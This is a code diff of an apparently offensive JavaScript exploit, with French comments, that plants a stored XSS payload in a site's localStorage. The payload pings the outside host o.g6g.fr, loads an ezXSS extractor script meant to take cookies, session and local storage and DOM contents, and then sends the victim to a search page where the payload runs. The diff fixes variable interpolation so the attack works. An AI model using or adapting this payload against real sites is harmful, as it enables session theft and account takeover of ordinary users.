@@ -44,14 +44,14 @@
     // -------- 4) GET ezXSS => exfill localstorage / session storage / cookies / DOM etc...  --------
 
     try {
-        var msPayload =   `"><img src=//o.g6g.fr/pingSrcFromMultiSearch onerror="alert(\'2eme_exec_js_ici_grace_au_local_storage_pollution sur ${document.domain} + exec ezxss\');import(EXTRACTOR);">`;
+        var msPayload =   `"><img src=//o.g6g.fr/pingSrcFromMultiSearch onerror="alert(\'2eme_exec_js_ici_grace_au_local_storage_pollution sur ${document.domain} + exec ezxss\');import(${EXTRACTOR});">`;
         localStorage.setItem('multiSearchTerms', JSON.stringify([msPayload]));
     } catch (e) {}
 
     // -------- 6) Navigation vers la page-sink pour que W() rende le terme seedé au load --------
     //   Délai court pour laisser partir le beacon/fetch avant l'unload.
     setTimeout(function () {
-        try { location.assign('/recherche-tout-en-un?serverOut=OOB'); }
-        catch (e) { location.href = '/recherche-tout-en-un?serverOut=OOB'; }
+        try { location.assign('/recherche-tout-en-un?serverOut='+OOB); }
+        catch (e) { location.href = '/recherche-tout-en-un?serverOut='+OOB; }
     }, 1200);
 })();
